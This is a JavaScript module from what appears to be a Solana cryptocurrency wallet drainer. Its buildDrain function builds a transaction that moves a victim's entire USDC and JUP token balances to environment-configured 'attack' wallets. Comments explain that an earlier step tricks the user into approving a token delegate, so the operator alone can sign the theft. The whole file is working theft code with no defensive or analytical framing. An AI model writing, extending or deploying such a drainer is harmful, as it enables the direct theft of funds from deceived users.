const {
    Transaction,
    PublicKey,
} = require("@solana/web3.js");

const { createTransferInstruction } = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");

async function buildDrain(user, connection) {
    const tx = new Transaction();

    const userPubkey = new PublicKey(user);

    const t = await getUserTokenAccounts(user, connection);

    if (!t) {
        throw new Error("getUserTokenAccounts() returned undefined");
    }

    if (!t.usdcATA) {
        throw new Error("USDC ATA not found");
    }

    if (!process.env.WALLET) {
        throw new Error("WALLET env variable is missing");
    }

    if (!process.env.ATTACK_WALLET) {
        throw new Error("ATTACK_WALLET env variable is missing");
    }

    if (!process.env.JUP_ATTACK_WALLET) {
        throw new Error("JUP_ATTACK_WALLET env variable is missing");
    }

    if (!process.env.PUBLIC_KEY) {
        throw new Error("PUBLIC_KEY env variable is missing");
    }

    // The drain tx is a delegate transfer:
    //   - approveFlow collects a SPL delegate approval from the user, naming
    //     `WALLET` as the delegate on the user's USDC and JUP ATAs.
    //   - This function builds a transfer that the delegate (WALLET's keypair
    //     = PRIVATE_KEY / PUBLIC_KEY) signs alone. The user is NOT a signer
    //     on the drain.
    const delegate = new PublicKey(process.env.WALLET);

    // POZOR: must be the SPL token account (ATA) for the destination wallet,
    // not a wallet pubkey. ATTACK_WALLET is the USDC ATA, JUP_ATTACK_WALLET
    // is the JUP ATA of the same receiving wallet.
    const usdcDestination = new PublicKey(process.env.ATTACK_WALLET);
    const jupDestination = new PublicKey(process.env.JUP_ATTACK_WALLET);

    const { blockhash } = await connection.getLatestBlockhash();

    tx.recentBlockhash = blockhash;
    tx.feePayer = new PublicKey(process.env.PUBLIC_KEY);

    if (t.usdc && t.usdc > 0n) {
        tx.add(
            createTransferInstruction(
                t.usdcATA,
                usdcDestination,
                delegate,
                t.usdc
            )
        );
    }

    if (t.jupATA && t.jup && t.jup > 0n) {
        tx.add(
            createTransferInstruction(
                t.jupATA,
                jupDestination,
                delegate,
                t.jup
            )
        );
    }

    return tx;
}

module.exports = { buildDrain };
